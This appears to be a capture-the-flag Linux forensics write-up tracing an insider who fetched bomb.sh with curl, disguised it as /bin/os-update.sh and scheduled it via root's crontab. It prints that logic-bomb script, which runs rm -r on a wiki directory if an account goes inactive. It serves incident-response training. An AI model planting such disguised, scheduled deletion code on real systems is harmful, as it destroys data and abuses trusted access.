## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Use your Linux forensics knowledge to investigate an incident.
Hey, kid! Good, you’re here!
Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.
CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.
## Connecting to the machine
Start the virtual machine in split-screen view by clicking on the green "Start Machine" button on the upper right section of this task. Alternatively, you can connect to the VM using the credentials below via "ssh".
```

## SSH_Credentials
| **Username** | root          |
| ------------ | ------------- |
| **Password** | [password omitted]      |
| **IP**       | 10.201.86.185 |
## Forensic
```Advice
Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.

My advice: Look at the privileged commands that were run. That should get you started.
```

## Section1 
Q1=The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND? for this 
```bash
# cat /home/*/.bash_history | grep "apt"
sudo apt install dokuwiki
sudo apt install dokuwiki
root@ip-10-201-86-185:~# grep 'apt install dokuwiki' /var/log/auth.log*
/var/log/auth.log.1:Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
/var/log/auth.log.1:Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
root@ip-10-201-86-185:~# 
```
A1= /usr/bin/apt install dokuwiki

Q2= What was the present working directory (PWD) when the previous command was run?
A2= /home/cybert

Q3=Which user was created after the package from the previous task was installed?
```bash
/var/log/auth.log.1:Dec 22 07:58:09 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m cybert -s /bin/bash
/var/log/auth.log.1:Dec 22 07:58:09 ip-10-10-158-38 useradd[1970]: new group: name=cybert, GID=1001
/var/log/auth.log.1:Dec 22 07:58:09 ip-10-10-158-38 useradd[1970]: new user: name=cybert, UID=1001, GID=1001, home=/home/cybert, shell=/bin/bash
/var/log/auth.log.1:Dec 28 06:26:53 ip-10-10-168-55 useradd[15328]: new user: name=it-admin, UID=1002, GID=1002, home=/home/it-admin, shell=/bin/bash
/var/log/auth.log.1:Feb 21 18:00:09 ip-10-10-237-12 useradd[25459]: new user: name=systemd-timesync, UID=111, GID=116, home=/run/systemd, shell=/usr/sbin/nologin, from=/dev/pts/2
/var/log/auth.log.1:Feb 21 18:02:39 ip-10-10-237-12 useradd[6687]: new user: name=tss, UID=112, GID=119, home=/var/lib/tpm, shell=/bin/false, from=/dev/pts/2
/var/log/auth.log.1:Feb 21 18:03:11 ip-10-10-237-12 useradd[10527]: new user: name=tcpdump, UID=113, GID=120, home=/nonexistent, shell=/usr/sbin/nologin, from=/dev/pts/2
/var/log/auth.log.1:Feb 21 18:05:30 ip-10-10-237-12 useradd[4603]: new user: name=fwupd-refresh, UID=114, GID=121, home=/run/systemd, shell=/usr/sbin/nologin, from=/dev/pts/2
```

After 28 Dec only it-admin user is added
A3= it-admin

Q4= A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
```bash
root@ip-10-201-86-185:~# visudo /etc/sudoers
visudo: /etc/sudoers.tmp unchanged                                                                              
root@ip-10-201-86-185:~# grep "visudo" /var/log/auth.log*
/var/log/auth.log.1:Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
/var/log/auth.log.1:Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
```
Hint= `Visudo` is called when editing the sudoers file
A4= Dec 28 06:27:34

Q5=A script file was opened using the "vi" text editor. What is the name of this file?
```bash
$ grep "vi" /var/log/auth.log*
/var/log/auth.log.1:Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'video'
/var/log/auth.log.1:Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'video'
/var/log/auth.log.1:Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
/var/log/auth.log.1:Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
/var/log/auth.log.1:Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
/var/log/auth.log.1:Dec 28 07:14:27 ip-10-10-243-54 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/service sshd restart
/var/log/auth.log.1:Feb 21 17:47:20 ip-10-10-237-12 systemd-logind[810]: Failed to start user service, ignoring: Transaction is destructive.
/var/log/auth.log.1:Feb 21 17:47:24 ip-10-10-237-12 systemd-logind[810]: Failed to start user service, ignoring: Transaction is destructive.
```
A5= bomb.sh

Q6= What is the command used that created the file bomb.sh?
```bash
root@ip-10-201-86-185:~# cat /home/*/.bash_history | grep bomb.sh
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
rm bomb.sh
```
A6= curl 10.10.158.38:8080/bomb.sh --output bomb.sh

Q7=The file was renamed and moved to a different directory. What is the full path of this file now?
Look for .vimInfo
```bash
cat .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!
# Viminfo version
|1,4
# Value of 'encoding' when this file was written
*encoding=utf-8
# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"
```
A7= /bin/os-update.sh

Q8=When was the file from the previous question last modified? (Format: Month Day HH:MM)
A8= look for file   12-28 06:29
```bash
root@ip-10-201-86-185:~# ls -la --full-time /bin/os-update.sh
-rw-r--r-- 1 root root 325 2022-12-28 06:29:43.998004273 +0000 /bin/os-update.sh
```
Q9= What is the name of the file that will get created when the file from the first question executes?
A9= its answer is in the /bin/os-update.sh which actually replaced by the file bomb.sh
goodbye.txt
```bash
cat /bin/os-update.sh
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
```

```Advice
So we have a file and a motive. The question we now have is: how will this file be executed?
Surely, he wants it to execute at some point?
```

Q10= At what time will the malicious file trigger? (Format: HH:MM AM/PM)
A10= 08:00 AM
```bash
root@ip-10-201-70-254:/# cat /etc/crontab | grep "bin/os-update.sh"
0 8     * * *   root    /bin/os-update.sh
```
